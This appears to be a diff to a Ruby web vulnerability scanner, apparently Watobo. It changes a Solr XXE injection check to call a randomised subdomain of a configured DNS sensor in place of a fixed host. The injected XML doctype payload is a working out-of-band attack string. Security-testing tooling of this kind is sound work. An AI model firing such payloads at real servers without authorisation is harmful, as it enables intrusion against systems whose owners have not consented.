@@ -48,7 +48,7 @@ EOF
                   test = chat.copyRequest
                   parm = param.copy
 
-                 inj = '{!xmlparser v=\'<!DOCTYPE a SYSTEM "http://solr.collab.qimera.eu/xxx\"><a></a>\'}'
+                 inj = '{!xmlparser v=\'<!DOCTYPE a SYSTEM "http://solr-xxe-' + SecureRandom.hex(3) + '.' + Watobo::Conf::Scanner.dns_sensor + '/xxx\"><a></a>\'}'
                   if parm.location == :url
                     parm.value = URI.escape(inj)
                   else
